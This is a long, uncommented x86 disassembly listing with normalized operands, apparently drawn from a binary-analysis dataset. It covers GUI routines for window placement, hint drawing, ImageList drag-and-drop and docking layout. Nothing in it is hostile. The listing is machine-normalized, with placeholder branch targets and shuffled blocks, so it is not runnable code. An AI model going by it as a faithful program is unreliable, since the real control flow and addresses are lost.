call sub_4591b8
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_4591c4
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_4591b8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_4591ac
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_4591c4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_4591a0
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_4591ac
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_4591a0
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_43fb00
push 0x4
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443c04
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_40421c
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_446c78
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call [ rw-data ]
sub_443c0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_443c34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_4124e4
mov eax esi
call sub_43df04
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_40441c
push eax
mov eax [ esi + 0x208 ]
call sub_41d530
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_443c90
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_4124e4
call sub_42bf68
call sub_42c048
test al al
jne r-xdata
call sub_42bf68
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_42c2d4
push esp
push 0x1
push 0xf
push 0x0
call sub_42bf68
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_42c0b8
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_443cfc
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_440408
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_443d20
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_443d60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_443e20
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45968c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_422254
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45968c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_422254
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_443e2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_448cc0
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_448dfc
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_443e8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_448cc0
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_443d60
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_443eec
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_443e2c
push 0x0
call ShowCursor
sub_443eec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_448cc0
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_443f50
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_443d20
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_443f50
push ebx
mov ebx eax
mov eax ebx
call sub_448cc0
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_443f74
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_448cc0
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_443d20
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_443fe8
push ebx
push esi
mov esi eax
mov eax esi
call sub_448cc0
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_443f50
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_443e74
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_444030
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43e0f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cde0
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43a7a8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_44408c
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43e21c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_4440dc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d0e4
xor eax eax
push ebp
push sub_44417a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41d5b0
xor eax eax
push ebp
push sub_444157
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43a7c0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44415e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41d5b0
retn
sub_44418c
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_444220
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_4441a8
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_444220
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_444818
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_444220
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_444254
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4442e4
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
mov edx 0x2
call sub_4442e4
jmp r-xdata
retn
sub_44429c
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_444350
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
mov edx 0x2
call sub_444350
jmp r-xdata
retn
sub_4442e4
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_444718
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_444350
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_444204
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_444718
push eax
mov eax esi
call sub_444254
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_444718
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_444400
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_444204
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_444818
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_444350
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_444204
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_444350
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_444254
mov edx eax
add edx esi
mov eax ebx
call sub_444740
mov edx edi
mov eax ebx
call sub_444740
jmp r-xdata
mov eax ebx
call sub_4445a0
mov eax ebx
call sub_4447f0
mov ebx eax
test ebx ebx
jne r-xdata
sub_4444a8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f5c
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403fb0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
sub_4444ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403420
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_44455d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_43c8e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_444570
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_4447f0
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_4445a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_444350
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_444350
mov esi eax
push ebp
call sub_444570
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4447f0
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4442e4
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4442e4
mov ecx ebx
pop edx
call sub_41250c
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43b58c
mov eax [ ebp - 0x4 ]
call sub_444718
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_444718
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_444718
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_444718
push ebx
mov ebx eax
mov eax ebx
call sub_444220
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_4441a8
test al al
je r-xdata
mov eax ebx
call sub_444254
pop ebx
retn
sub_444754
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444740
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4441f0
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_444744
mov edx esi
call sub_444754
sub_444790
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_444718
mov edi eax
mov eax ebx
call sub_444254
cmp edi eax
jl r-xdata
mov eax esi
call sub_444400
mov eax [ esi + 0x1c ]
push eax
push sub_4462a0
mov edx esi
call sub_444acc
mov eax ebx
call sub_444718
mov edi eax
mov eax esi
call sub_44429c
cmp edi eax
jle r-xdata
mov eax ebx
call sub_444790
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_4447fc
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_444220
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_444824
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4031f4
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403530
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4441cc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cae8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_421d14
mov edx eax
mov eax ebx
call sub_41cc64
mov eax [ ebp - 0x4 ]
call sub_4449f4
xor eax eax
push ebp
push sub_444930
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43f0fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_444400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444937
mov eax [ ebp - 0x4 ]
call sub_4449f8
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_43f0c0
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_444937
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_4467c8
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_44498c
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_4459f8
mov eax [ esi + 0x10 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_444a0c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_444a0c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_444a0c
pop ecx
sub_444a64
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_444a0c
pop ecx
sub_444a90
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_444a90
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_444a90
pop ecx
sub_444ae4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_444a64
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_444350
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_444350
push eax
mov edx 0x1
mov eax ebx
call sub_4442e4
push eax
mov edx 0x2
mov eax ebx
call sub_4442e4
pop edx
pop ecx
call sub_41250c
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402c40
jmp r-xdata
add esp 0x10
pop edi
pop esi
